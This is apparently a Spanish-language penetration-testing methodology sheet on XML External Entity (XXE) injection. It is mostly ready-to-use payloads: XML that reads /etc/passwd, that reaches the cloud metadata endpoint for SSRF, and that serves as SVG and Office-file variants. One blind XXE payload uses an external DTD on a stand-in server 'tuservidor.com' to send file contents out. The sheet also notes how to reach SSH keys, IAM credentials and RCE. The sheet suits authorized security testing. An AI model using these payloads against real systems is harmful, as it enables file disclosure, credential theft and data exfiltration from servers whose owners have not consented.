# XXE — XML External Entity Injection

## Señales de entrada
- Endpoints que aceptan XML: `Content-Type: application/xml`, `text/xml`.
- Funciones de import/export de datos en XML.
- Parsers de documentos: DOCX, XLSX, SVG, PDF con XML interno.
- APIs SOAP.
- File upload que acepta SVG o XML.

## Metodología

### Paso 1: identificar superficies XML
```bash
# Cambiar Content-Type en Burp y enviar XML
Content-Type: application/xml

<?xml version="1.0"?>
<data><item>test</item></data>

# Ver si el servidor lo parsea (respuesta diferente, no error de formato)
```

### Paso 2: XXE básico (lectura de ficheros)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><item>&xxe;</item></data>
```

### Paso 3: XXE con SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data><item>&xxe;</item></data>
```

### Paso 4: XXE ciego (Blind XXE)
```xml
<!-- Exfiltración out-of-band via DTD externo -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://tuservidor.com/evil.dtd">
  %xxe;
]>
<data><item>test</item></data>
```

```xml
<!-- evil.dtd en tu servidor -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://tuservidor.com/?x=%file;'>">
%eval;
%exfil;
```

### SVG con XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### XLSX/DOCX con XXE
- Descomprimir el archivo (son ZIP).
- Modificar `xl/workbook.xml` o `word/document.xml` con entidad externa.
- Recomprimir y subir.

## Impacto alto
- Lectura de ficheros del sistema: `/etc/passwd`, claves SSH, configs de app.
- SSRF a metadata cloud → credenciales IAM.
- En algunos parsers: RCE via `expect://id`.
- Denegación de servicio via Billion Laughs (si el programa lo acepta).

## Falsos positivos
- Parser no evalúa entidades externas (bien configurado).
- Librería modern XML con external entities deshabilitadas por defecto.
- Error de parsing pero sin procesamiento de la entidad.

## Evidencia mínima
- Contenido de `/etc/passwd` o similar visible en respuesta.
- O request recibido en Burp Collaborator con datos del fichero.
- Request XML completo + respuesta con datos extraídos.
